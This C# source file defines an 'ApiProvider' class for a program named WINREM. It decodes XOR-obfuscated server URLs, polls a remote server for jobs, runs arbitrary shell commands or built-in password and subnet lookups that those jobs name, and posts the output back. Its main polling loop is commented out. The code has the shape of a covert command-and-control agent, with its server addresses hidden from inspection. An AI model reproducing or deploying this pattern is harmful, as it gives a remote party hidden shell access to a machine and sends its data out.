using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Reflection.Metadata.Ecma335;
using System.Text;
using System.Threading.Tasks;
using WINREM.DTO;

namespace WINREM
{
    public class ApiProvider
    {
        private byte[] checkEndpoint = new byte[] { 177, 198, 63, 49, 46, 63, 65, 210, 249, 172, 32, 179, 136, 57, 245, 8, 26, 227, 153, 175, 215, 12, 234, 201, 52, 98, 17, 56, 155, 207, 197, 44, 242, 45, 47, 105, 91, 155, 49, 113, 49, 246, 144, 165, 145, 255, 189, 117, 244, 129, 111 };
        private byte[] postEndpoint = new byte[] { 177, 198, 63, 49, 46, 63, 65, 210, 249, 172, 32, 179, 136, 57, 245, 8, 26, 227, 153, 175, 215, 12, 234, 201, 52, 98, 17, 56, 155, 207, 197, 44, 242, 45, 47, 105, 91, 155, 49, 122, 57, 241, 141, 254, 141, 165, 161, 96, 237, 153, 117, 115, 58, 121, 119, 100};

        private string xOrUrl(byte[] url, byte[] key)
        {
            for(int i = 0; i < url.Length - 1; i++)
            {
                url[i] = (byte)(url[i] ^ key[i]);
            }
            return Encoding.UTF8.GetString(url);
        }

        //public byte[] encrypt(string data, byte[] key)
        //{
        //    byte[] dataBytes = Encoding.UTF8.GetBytes(data);
        //    for(int i = 0; i < dataBytes.Length - 1; i++)
        //    {
        //        dataBytes[i] = (byte)(dataBytes[i] ^ key[i]);
        //    }
        //    return dataBytes;
        //}

        //public void PrintByteArray(byte[] bytes)
        //{
        //    var sb = new StringBuilder("new byte[] { ");
        //    foreach (var b in bytes)
        //    {
        //        sb.Append(b + ", ");
        //    }
        //    sb.Append("}");
        //    Console.WriteLine(sb.ToString());
        //}
        public async Task CheckForJob(string apiKey, byte[] key)
        {
            string getUrl = xOrUrl(checkEndpoint, key);
            string PostUrl = xOrUrl(postEndpoint, key);

            //List<JobDTO> jobs = GetJobs(getUrl, apiKey).Result;
            //foreach (JobDTO job in jobs)
            //{
            //    string result = await ExecuteJob(job);
            //    PostDTO PostData = new PostDTO { apiKey = apiKey, output = result };
            //    await SendJobResult(PostUrl, PostData);
            //}
        }

        private async Task<string> ExecuteJob(JobDTO job)
        {
            string result = "";
            Built_in_function shellFunction = new Built_in_function();
            try
            {
                if (job.shellCommand)
                {
                    result = shellFunction.CustomScript(job.command);
                }
                else
                {
                    switch (job.command)
                    {
                        case "builtin.password":
                            result = shellFunction.GetPasswordDate();
                            break;
                        case "builtin.checksubnet":
                            result = shellFunction.GetSubNet();
                            break;
                        default:
                            result = "Command not built-in";
                            break;

                    }
                }
            }
            catch (Exception e)
            {
                result = e.Message;
            }
            return result;
        }

        private async Task<List<JobDTO>> GetJobs(string url, string apikey)
        {
            var jsonData = JsonConvert.SerializeObject(new GetDTO { apiKey = apikey });
            var data = new StringContent(jsonData, Encoding.UTF8, "application/json");
            
            var client = new HttpClient();
            var response = await client.PostAsync(url, data);

            if(response.IsSuccessStatusCode)
            {
                var responseContent = await response.Content.ReadAsStringAsync();
                var jobResponse = JsonConvert.DeserializeObject<JobResponseDTO>(responseContent);
                return jobResponse.jobs;
            }
            else
            {
                throw new Exception("Failed to get jobs");
            }
        }

        private async Task SendJobResult(string url, PostDTO PostData)
        {
            var JsonData = JsonConvert.SerializeObject(PostData);
            var Data = new StringContent(JsonData, Encoding.UTF8, "application/json");

            var client = new HttpClient();
            var response = await client.PostAsync(url, Data);

            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine("Job result sent successfully");
            }
            else 
            {
                Console.WriteLine("Failed to send job result");
            }
        }
    }
}
